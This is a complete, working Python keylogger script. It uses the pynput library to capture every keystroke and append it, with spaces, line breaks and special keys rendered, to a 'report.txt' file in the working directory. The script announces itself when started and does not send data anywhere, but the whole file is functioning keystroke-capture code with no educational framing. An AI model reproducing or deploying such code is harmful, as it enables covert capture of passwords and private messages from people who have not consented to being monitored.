from pynput.keyboard import Listener
import os
log_file_path = os.path.join(os.getcwd(), "report.txt")

def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            if key == key.space:
                log_file.write(" ")
            elif key == key.enter:
                log_file.write("\n")
            else:
                log_file.write(f" {key} ")

def start_keylogger():
    print(f"Logging keystrokes to: {log_file_path}")
    with Listener(on_press=on_press) as listener:
        listener.join()
if __name__ == "__main__":
    print("Keylogger started... Press Ctrl+C to stop.")
    start_keylogger()
